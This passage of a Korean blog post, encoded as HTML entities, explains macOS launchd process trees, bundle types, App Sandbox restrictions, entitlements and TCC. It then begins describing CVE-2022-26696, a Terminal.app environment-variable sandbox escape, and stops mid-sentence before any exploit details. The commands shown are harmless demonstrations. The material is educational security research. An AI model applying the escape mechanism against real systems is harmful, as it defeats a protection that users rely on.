&#xB2E4;&#xB9CC; &#xB2E8;&#xC810;&#xB3C4; &#xC788;&#xB294;&#xB370;&#xC694;, &#xBCF4;&#xD1B5; &#xB2E4;&#xB978; OS&#xC5D0;&#xC11C;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC5B4;&#xB5A4; &#xD130;&#xBBF8;&#xB110;, &#xC178;, &#xB370;&#xBAAC;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD588;&#xB294;&#xC9C0; <strong>&#xD504;&#xB85C;&#xC138;&#xC2A4; &#xD2B8;&#xB9AC;(PPID)</strong>&#xB97C; &#xB530;&#xB77C;&#xAC00;&#xBA70; &#xCD94;&#xC801;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;. &#xD558;&#xC9C0;&#xB9CC; macOS&#xC5D0;&#xC11C;&#xB294; &#xC571;&#xC744; GUI&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD560; &#xACBD;&#xC6B0;, <strong>&#xBAA8;&#xB4E0; &#xC571;&#xC774; launchd&#xC758; &#xC790;&#xC2DD;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;</strong>, &#xD2B8;&#xB9AC;&#xAC00; &#xD3C9;&#xD3C9;&#xD558;&#xAC8C; &#xBCF4;&#xC5EC;&#xC11C; &#xAE54;&#xB054;&#xD558;&#xAC8C; &#xAD6C;&#xC870;&#xB97C; &#xC54C; &#xC218; &#xC5C6;&#xC5B4;&#xC694;. </p><p>macOS Ventura &#xC774;&#xC804; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; open &#xBA85;&#xB839;&#xC5B4; &#xC5C6;&#xC774; &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC744; &#xC9C1;&#xC811; &#xD638;&#xCD9C;&#xD574;&#xC11C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xB294;&#xB370;, &#xC81C;&#xB300;&#xB85C; &#xB41C; launchd &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xC73C;&#xBA74;  App Sandbox&#xC640; TCC&#xB97C; &#xBCF4;&#xD638;&#xD558;&#xAE30; &#xC704;&#xD574; macOS&#xAC00; &#xAC15;&#xC81C;&#xB85C; &#xC885;&#xB8CC;(SIGKILL)&#xD558;&#xB3C4;&#xB85D; &#xC81C;&#xD55C;&#xB418;&#xC5C8;&#xC5B4;&#xC694;. </p><pre><code class="hljs bash">$ /System/Applications/Calculator.app/Contents/MacOS/Calculator &amp; $ ps -A -j | grep Calculator | grep -v grep</code></pre><p>&#xC6D0;&#xB798;&#xB294; &#xC704; &#xBA85;&#xB839;&#xC5B4;&#xCC98;&#xB7FC; &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC744; &#xC9C1;&#xC811; &#xD638;&#xCD9C;&#xD574;&#xC11C; &#xC2E4;&#xD589;&#xD558;&#xAC8C; &#xB418;&#xBA74;, &#xBD80;&#xBAA8; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; <code>launchd</code>&#xAC00; &#xC544;&#xB2C8;&#xB77C; &#xD604;&#xC7AC; &#xD130;&#xBBF8;&#xB110; &#xC138;&#xC158;&#xC758; PID&#xB97C; &#xBD80;&#xC5EC; &#xBC1B;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989;, &#xD130;&#xBBF8;&#xB110;&#xC5D0;&#xC11C; &#xC9C1;&#xC811; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xADF8; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xD130;&#xBBF8;&#xB110;&#xC758; &#xC790;&#xC2DD;&#xC774; &#xB418;&#xC5C8;&#xB358;&#xAC70;&#xC8E0;.</p><p>&#xC608;&#xC2DC;&#xB85C; &#xB4E4;&#xC5C8;&#xB358; Calculator&#xB294; &#xC9C1;&#xC811; &#xD638;&#xCD9C;&#xC774; &#xB418;&#xC9C0; &#xC54A;&#xC544;&#xC11C;, &#xD14C;&#xC2A4;&#xD2B8;&#xC6A9; .app&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xC11C; PID&#xC640; PPID&#xB97C; &#xD655;&#xC778;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">mkdir -p ~/MyApp.app/Contents/MacOS<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&apos;#!/bin/bash\nsleep 10&apos;</span> &gt; ~/MyApp.app/Contents/MacOS/MyAppchmod +x ~/MyApp.app/Contents/MacOS/MyApp~/MyApp.app/Contents/MacOS/MyApp &amp;ps -A -j | grep MyAppopen -a MyAppps -A -j | grep MyApp</code></pre><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image3.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image4.png" alt="image.png"></p><p>&#xC774;&#xB807;&#xAC8C; &#xD130;&#xBBF8;&#xB110;&#xC758; &#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;! </p><p><code>launchd</code>&#xB294; &#xC774; &#xC678;&#xC5D0;&#xB3C4; &#xB2E4;&#xC591;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xB9E1;&#xACE0; &#xC788;&#xC5B4;&#xC694;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, <code>LaunchAgents</code>&#xB098; <code>LaunchDaemons</code>&#xB97C; &#xD1B5;&#xD574; macOS&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xBC31;&#xADF8;&#xB77C;&#xC6B4;&#xB4DC; &#xC11C;&#xBE44;&#xC2A4;&#xB4E4;&#xC744; &#xAD00;&#xB9AC;&#xD558;&#xACE0; &#xC788;&#xC5B4;&#xC694;. &#xC624;&#xB298;&#xC740; &#xB2E4;&#xB8E8;&#xC9C0; &#xC54A;&#xC744;&#xAC8C;&#xC694;! &#xD22C;&#xBE44;&#xCEE8;&#xD2F0;&#xB274;&#x2026;..</p><p>&#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xC124;&#xBA85;&#xD55C; <code>.app</code>&#xC740; &#xC5EC;&#xB7EC; &#xC885;&#xB958;&#xC758; &#xBC88;&#xB4E4; &#xC911; &#xD558;&#xB098;&#xC77C; &#xBFD0;&#xC778;&#xB370;&#xC694;.</p><p>macOS&#xC5D0;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xB2E4;&#xC591;&#xD55C; &#xBC88;&#xB4E4; &#xD0C0;&#xC785;&#xB4E4;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. (&#xC644;&#xC804;&#xD55C; &#xBAA9;&#xB85D;&#xC740; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;&#x314E;&#x314E;;;)</p><ul><li><code>.app</code> &#x2013;  &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xBC88;&#xB4E4;&#xB85C;, &#xD558;&#xB098;&#xC758; &#xC571;&#xC744; &#xAD6C;&#xC131;&#xD558;&#xB294; &#xBAA8;&#xB4E0; &#xC694;&#xC18C;&#xB97C; &#xD3EC;&#xD568;</li><li><code>.framework</code> &#x2013; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C; &#xBC88;&#xB4E4;&#xB85C;, <code>.dylib</code>&#xCC98;&#xB7FC; &#xB85C;&#xB4DC; &#xAC00;&#xB2A5;&#xD55C; &#xCF54;&#xB4DC;&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xB9AC;&#xC18C;&#xC2A4;, &#xBC84;&#xC804; &#xC815;&#xBCF4; &#xB4F1;&#xC744; &#xD3EC;&#xD568; ( <code>dlopen()</code>&#xC73C;&#xB85C; &#xC804;&#xCCB4; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C; &#xBC88;&#xB4E4;&#xC744; &#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC74C;)</li><li><code>.kext</code> &#x2013;  &#xCEE4;&#xB110; &#xC775;&#xC2A4;&#xD150;&#xC158; &#xBC88;&#xB4E4;&#xB85C;, macOS &#xCEE4;&#xB110;&#xC5D0; &#xC9C1;&#xC811; &#xB85C;&#xB4DC;&#xB418;&#xC5B4; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xD655;&#xC7A5; &#xBAA8;&#xB4C8;<br>&#xBCF4;&#xC548;&#xC0C1;&#xC758; &#xC774;&#xC720;&#xB85C; Apple&#xC740; macOS &#xCD5C;&#xC2E0; &#xBC84;&#xC804;&#xB4E4;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xC744; &#xC810;&#xCC28; &#xC81C;&#xD55C;&#xD558;&#xACE0; &#xC788;&#xC74C;</li><li><code>.plugin</code> &#x2013; &#xD50C;&#xB7EC;&#xADF8;&#xC778; &#xBC88;&#xB4E4;&#xB85C;, &#xBA54;&#xC778; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xB418;&#xB294; &#xD655;&#xC7A5; &#xBAA8;&#xB4C8;&#xC744; &#xD3EC;&#xD568;</li></ul><p>&#xC774;&#xCC98;&#xB7FC; &#xBC88;&#xB4E4;&#xC740; &#xB2E8;&#xC21C;&#xD788; &#xC571;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xAC83; &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C;, macOS &#xC804;&#xBC18;&#xC5D0;&#xC11C; &#xAE30;&#xB2A5; &#xD655;&#xC7A5;&#xACFC; &#xBAA8;&#xB4C8;&#xD654;&#xB41C; &#xAD6C;&#xC870;&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xD575;&#xC2EC; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD574;&#xAC00; &#xC798; &#xB418;&#xC168;&#xB098;&#xC694;? </p><p>&#xADF8;&#xB807;&#xB2F4; &#xB2E4;&#xC74C;&#xC73C;&#xB85C; &#xB118;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;~</p><h2 id="1-App-Sandbox"><a href="#1-App-Sandbox" class="headerlink" title="1. App Sandbox"></a>1. App Sandbox</h2><p>&#xC55E;&#xC5D0;&#xC11C; macOS &#xC571;&#xC774; <code>.app</code> &#xBC88;&#xB4E4;&#xC774;&#xB77C;&#xB294; &#xAD6C;&#xC870;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88;&#xC5D4; &#xADF8; &#xC571;&#xC774; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xC5B4;&#xB5BB;&#xAC8C; &#xC2E4;&#xD589;&#xB418;&#xACE0;, &#xB610; &#xC5BC;&#xB9C8;&#xB098; &#xC81C;&#xC57D;&#xC744; &#xBC1B;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBCFC;&#xD150;&#xB370;&#xC694;. </p><p>&#xC624;&#xB298;&#xC758; &#xD575;&#xC2EC; &#xB0B4;&#xC6A9;&#xC778; <strong>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;(Sandbox)</strong>&#xB77C;&#xB294; &#xAC1C;&#xB150;&#xC785;&#xB2C8;&#xB2E4;!</p><p>&#xBCF4;&#xC548; &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#xBCF4;&#xBA74;, &#xC774;&#xC0C1;&#xC801;&#xC778; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xBBFF;&#xC744; &#xC218; &#xC5C6;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xC544;&#xC608; &#xC2E4;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xCEF4;&#xD4E8;&#xD130;&#xACA0;&#xC8E0;. &#xD558;&#xC9C0;&#xB9CC; &#xCEF4;&#xD4E8;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB2E4;&#xBCF4;&#xBA74; &#xB2E4;&#xC591;&#xD55C; &#xC571;&#xC744; &#xC124;&#xCE58;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xC788;&#xC73C;&#xB2C8; &#xC774;&#xAC74; &#xBD88;&#xAC00;&#xB2A5;&#xD55C; &#xC598;&#xAE30;&#xC608;&#xC694;&#x2026; &#xADF8;&#xB798;&#xC11C; macOS&#xB294; &#xC544;&#xC608; &#x2018;<strong>&#xC571;&#xC744; &#xC81C;&#xD55C;&#xB41C; &#xC6B8;&#xD0C0;&#xB9AC; &#xC548;&#xC5D0;&#xC11C;&#xB9CC; &#xB3CC;&#xC544;&#xAC00;&#xAC8C; &#xD558;&#xC790;!</strong>&#x2019;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xBCF4;&#xC548;&#xC744; &#xC124;&#xACC4;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8; &#xC6B8;&#xD0C0;&#xB9AC;&#xAC00; &#xBC14;&#xB85C; <strong>App Sandbox&#xC778;&#xB370;&#xC694;</strong>. &#xC774;&#xB984; &#xADF8;&#xB300;&#xB85C;, &#xC571;&#xC744; &#x2018;&#xC0C1;&#xC790;&#x2019; &#xC548;&#xC5D0; &#xAC00;&#xB46C;&#xB193;&#xACE0; <strong>&#xBC16;&#xC73C;&#xB85C; &#xBABB; &#xB098;&#xAC00;&#xAC8C; &#xB9C9;&#xC544;&#xBC84;&#xB9AC;&#xB294; &#xAD6C;&#xC870;</strong>&#xC778; &#xAC70;&#xC8E0;.</p><p>&#xC571;&#xC774; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC548;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xBA74;, &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xD56D;&#xBAA9;&#xB4E4;&#xC774; &#xC81C;&#xD55C;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xC544;&#xBB34;&#xAC83;&#xB3C4; &#xD560; &#xC218; &#xC5C6;&#xC5B4;&#xC694;.</p><div class="table-container"><table><thead><tr><th>&#xC81C;&#xD55C; &#xD56D;&#xBAA9;</th><th>&#xC124;&#xBA85;</th></tr></thead><tbody><tr><td>&#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;</td><td>&#xC0AC;&#xC6A9;&#xC790; &#xD648; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C; &#xC811;&#xADFC; &#xCC28;&#xB2E8;</td></tr><tr><td>&#xB124;&#xD2B8;&#xC6CC;&#xD06C;</td><td>&#xC778;&#xD130;&#xB137; &#xC811;&#xC18D; &#xBC0F; &#xC18C;&#xCF13; &#xD1B5;&#xC2E0; &#xCC28;&#xB2E8;</td></tr><tr><td>&#xB9C8;&#xC774;&#xD06C;&#xB7;&#xCE74;&#xBA54;&#xB77C;</td><td>&#xC9C1;&#xC811; &#xC811;&#xADFC; &#xBD88;&#xAC00;&#xB2A5; (TCC &#xC2B9;&#xC778; &#xD544;&#xC694;)</td></tr><tr><td>&#xC0AC;&#xC9C4; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;</td><td>&#xC811;&#xADFC; &#xBD88;&#xAC00;&#xB2A5; (&#xBCC4;&#xB3C4; &#xAD8C;&#xD55C; &#xD544;&#xC694;)</td></tr><tr><td>&#xC2DC;&#xC2A4;&#xD15C; API</td><td>&#xC2DC;&#xC2A4;&#xD15C; &#xD638;&#xCD9C; &#xBC0F; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC81C;&#xC5B4; &#xB4F1; &#xCC28;&#xB2E8;</td></tr><tr><td>&#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;</td><td>&#xC0DD;&#xC131; &#xAC00;&#xB2A5;&#xD558;&#xB354;&#xB77C;&#xB3C4; &#xB3D9;&#xC77C;&#xD55C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xAC00; &#xC0C1;&#xC18D;&#xB428;</td></tr></tbody></table></div><p>&#xADF8;&#xB7EC;&#xB098;.. &#xC571;&#xC758; &#xD544;&#xC218; &#xAE30;&#xB2A5;&#xC774; &#xC81C;&#xD55C;&#xB418;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D;.. &#xD2B9;&#xC815;&#xD55C; &#xAD8C;&#xD55C;&#xB9CC; &#xC608;&#xC678;&#xC801;&#xC73C;&#xB85C; &#xD5C8;&#xC6A9;&#xD574;&#xC8FC;&#xB3C4;&#xB85D; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xBBF8;&#xC9C0; &#xD3B8;&#xC9D1; &#xC571;&#xC744; &#xC608;&#xB85C; &#xB4E4;&#xC5B4;&#xBCFC;&#xAC8C;&#xC694;. &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC9C0;&#xC815;&#xD55C; &#xD3F4;&#xB354;&#xC5D0;&#xC11C; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xC5F4;&#xACE0; &#xC800;&#xC7A5;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370;, &#xC571;&#xC774; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC548;&#xC5D0;&#xC11C; &#xB3D9;&#xC791;&#xD558;&#xB824;&#xBA74; &#xD2B9;&#xC815; &#xAD8C;&#xD55C;&#xC774; <strong>&#xC608;&#xC678;&#xC801;&#xC73C;&#xB85C; &#xD5C8;&#xC6A9;</strong>&#xB418;&#xC5B4;&#xC57C; &#xD574;&#xC694;. &#xC774;&#xAC78; &#xC124;&#xC815;&#xD558;&#xB294; &#xAC83;&#xC774; &#xBC14;&#xB85C; <code>Entitlements</code>&#xC785;&#xB2C8;&#xB2E4;. </p><p><em>* <code>Entitlements</code> : &#xC571;&#xC774; &#xCF54;&#xB4DC; &#xC11C;&#xBA85;&#xB420; &#xB54C; &#xD568;&#xAED8; &#xC815;&#xC758;&#xB418;&#xB294; &#xAD8C;&#xD55C; &#xC120;&#xC5B8; &#xC815;&#xBCF4;&#xB97C; &#xB73B;&#xD569;&#xB2C8;&#xB2E4;.</em></p><h3 id="1-1-Entitlements&#xB780;"><a href="#1-1-Entitlements&#xB780;" class="headerlink" title="1.1 Entitlements&#xB780;?"></a>1.1 Entitlements&#xB780;?</h3><p>&#xC571;&#xC774; &#xCF54;&#xB4DC; &#xC11C;&#xBA85;&#xB420; &#xB54C; &#xD568;&#xAED8; &#xC815;&#xC758;&#xB418;&#xB294; <strong>&#xAD8C;&#xD55C; &#xC120;&#xC5B8; &#xC815;&#xBCF4;</strong>&#xB97C; &#xB73B;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C;, &#xD544;&#xC694;&#xD55C; &#xAD8C;&#xD55C;&#xC744; &#xD558;&#xB098;&#xC529; &#xCD94;&#xAC00;&#xD558;&#xBA74; &#xB418;&#xB294;&#xB370;, &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xC791;&#xC131;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><div class="table-container"><table><thead><tr><th>Entitlement &#xD0A4;</th><th>&#xC124;&#xBA85;</th></tr></thead><tbody><tr><td><code>com.apple.security.network.client</code></td><td>&#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;</td></tr><tr><td><code>com.apple.security.files.user-selected.read-write</code></td><td>&#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC120;&#xD0DD;&#xD55C; &#xD30C;&#xC77C;&#xC5D0; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30; &#xAC00;&#xB2A5;</td></tr><tr><td><code>com.apple.security.assets.pictures.read-write</code></td><td>&#xC0AC;&#xC9C4; &#xD3F4;&#xB354; &#xC811;&#xADFC; &#xAC00;&#xB2A5;</td></tr><tr><td><code>com.apple.security.device.camera</code></td><td>&#xCE74;&#xBA54;&#xB77C; &#xC811;&#xADFC; &#xAC00;&#xB2A5;</td></tr></tbody></table></div><p>&#xC989;, &#xC571;&#xC740; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xC544;&#xBB34;&#xAC83;&#xB3C4; &#xBABB; &#xD558;&#xC9C0;&#xB9CC;, &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD5C8;&#xC6A9;&#xD55C; &#xAD8C;&#xD55C;&#xC5D0; &#xD55C;&#xD574;&#xC11C;&#xB9CC; &#xB3D9;&#xC791;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC70;&#xC608;&#xC694;.</p><p><code>Entitlements</code>&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; XML &#xD615;&#xC2DD;&#xC758; <code>.entitlements</code> &#xD30C;&#xC77C;&#xB85C; &#xC791;&#xC131;&#xB418;&#xBA70;, Xcode&#xC5D0;&#xC11C;&#xB294; Target &gt; Signing &amp; Capabilities &#xD0ED;&#xC5D0;&#xC11C; &#xC2DC;&#xAC01;&#xC801;&#xC73C;&#xB85C; &#xCD94;&#xAC00;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;.</p><p>++  &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xB550; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xAF2D; &#xC120;&#xC5B8;&#xD574;&#xC57C; &#xD574;&#xC694;. </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.security.app-sandbox<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span></code></pre><p>&#xC774; &#xD0A4;&#xAC00; &#xC120;&#xC5B8;&#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC57C; macOS&#xB294; &#xD574;&#xB2F9; &#xC571;&#xC744; <strong>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xBAA8;&#xB4DC;&#xB85C; &#xC2E4;&#xD589;</strong>&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="1-2-TCC"><a href="#1-2-TCC" class="headerlink" title="1.2 TCC"></a>1.2 TCC</h3><p>macOS&#xB97C; &#xC4F0;&#xB2E4; &#xBCF4;&#xBA74; &#xC774;&#xB7F0; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF8; &#xC801; &#xC788;&#xC73C;&#xC2E4; &#xAC70;&#xC608;&#xC694;.</p><blockquote><p>&#x201C;@@@ &#xC571;&#xC774; &#x2018;Documents&#x2019; &#xD3F4;&#xB354;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xD5C8;&#xC6A9;&#xD558;&#xC2DC;&#xACA0;&#xC2B5;&#xB2C8;&#xAE4C;?&#x201D;</p></blockquote><p>&#xC774; &#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xB2E8;&#xC21C;&#xD55C; &#xC54C;&#xB9BC;&#xC774; &#xC544;&#xB2C8;&#xB77C;, macOS&#xC758; &#xBCF4;&#xC548; &#xC2DC;&#xC2A4;&#xD15C; &#xC911; &#xD558;&#xB098;&#xC778; <strong>TCC</strong>(Transparency, Consent, and Control)&#xC5D0; &#xC758;&#xD574; &#xB098;&#xD0C0;&#xB098;&#xB294; &#xACBD;&#xACE0;&#xC785;&#xB2C8;&#xB2E4;. &#xC571;&#xC774; &#xBBFC;&#xAC10;&#xD55C; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB824; &#xD560; &#xB54C;, macOS&#xB294; &#xBB34;&#xC870;&#xAC74; &#xBA3C;&#xC800; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; <strong>&#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xB3D9;&#xC758;</strong>&#xB97C; &#xAD6C;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xACFC;&#xC815;&#xC744; &#xD1B5;&#xD574; macOS&#xB294; &#xC0AC;&#xC6A9;&#xC790; &#xB3D9;&#xC758; &#xC5C6;&#xC774;&#xB294; &#xC571;&#xC774; &#xC911;&#xC694;&#xD55C; &#xC790;&#xC6D0;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB3C4;&#xB85D; &#xB9C9;&#xACE0; &#xC788;&#xC5B4;&#xC694;.</p><h2 id="2-Sandbox-Escape"><a href="#2-Sandbox-Escape" class="headerlink" title="2. Sandbox Escape"></a>2. Sandbox Escape</h2><p>&#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; macOS&#xC758; App Sandbox&#xAC00; &#xC5BC;&#xB9C8;&#xB098; &#xB2E8;&#xB2E8;&#xD558;&#xAC8C; &#xC124;&#xACC4;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBCF4;&#xC558;&#xB294;&#xB370;&#xC694;!</p><p>&#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xC774;&#xAC78; <strong>&#xC6B0;&#xD68C;&#xD574;&#xC11C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB97C; &#xBE60;&#xC838;&#xB098;&#xC624;&#xB294; &#xAC8C; &#xAC00;&#xB2A5;&#xD560;&#xAE4C;&#xC694;?</strong></p><p>&#xB2F9;&#xC5F0;&#xD788; &#xC27D;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026;.</p><p>macOS&#xB294; &#xC571;&#xC758; &#xAD8C;&#xD55C;&#xC744; &#xCCA0;&#xC800;&#xD788; &#xC81C;&#xD55C;&#xD558;&#xACE0;, &#xC2DC;&#xC2A4;&#xD15C; &#xC790;&#xC6D0;&#xC5D0; &#xB300;&#xD55C; &#xC811;&#xADFC;&#xB3C4; &#xC774;&#xC911;&#xC73C;&#xB85C; &#xD1B5;&#xC81C;&#xD558;&#xACE0; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD5C8;&#xC220;&#xD55C; &#xAD6C;&#xC870;&#xB9CC; &#xB178;&#xB824;&#xC11C;&#xB294; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xBC14;&#xAE65;&#xC73C;&#xB85C; &#xBE60;&#xC838;&#xB098;&#xC624;&#xAE30; &#xC5B4;&#xB835;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xADF8;&#xB7FC;&#xC5D0;&#xB3C4; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC788;&#xC5C8;&#xB294;&#xB370;&#xC694;. macOS&#xC5D0;&#xC11C; <strong>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xB358; &#xC0AC;&#xB840;&#xB4E4;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xC5EC; &#xB354; &#xC790;&#xC138;&#xD788; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD560;&#xAC8C;&#xC694;!</strong> </p><h3 id="2-1-CVE-2022-26696-Terminal-app&#xC744;-&#xD1B5;&#xD55C;-Sandbox-Escape"><a href="#2-1-CVE-2022-26696-Terminal-app&#xC744;-&#xD1B5;&#xD55C;-Sandbox-Escape" class="headerlink" title="2.1 CVE-2022-26696: Terminal.app&#xC744; &#xD1B5;&#xD55C; Sandbox Escape"></a>2.1 CVE-2022-26696: Terminal.app&#xC744; &#xD1B5;&#xD55C; Sandbox Escape</h3><p>CVE-2022-26696&#xB294; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB41C; &#xC571;&#xC774; <code>Terminal.app</code>&#xC744; &#xC2E4;&#xD589;&#xD560; &#xB54C; <strong>&#xD2B9;&#xC815; &#xD658;&#xACBD; &#xBCC0;&#xC218;</strong>&#xB97C; &#xC124;&#xC815;&#xD558;&#xBA74;, Terminal&#xC774; &#xADF8; &#xD658;&#xACBD;&#xC744; &#xADF8;&#xB300;&#xB85C; &#xBB3C;&#xB824;&#xBC1B;&#xC544; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB97C; &#xBC97;&#xC5B4;&#xB0A0; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xC5C8;&#xC5B4;&#xC694;.</p><p>Terminal &#xB0B4;&#xBD80; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74;, 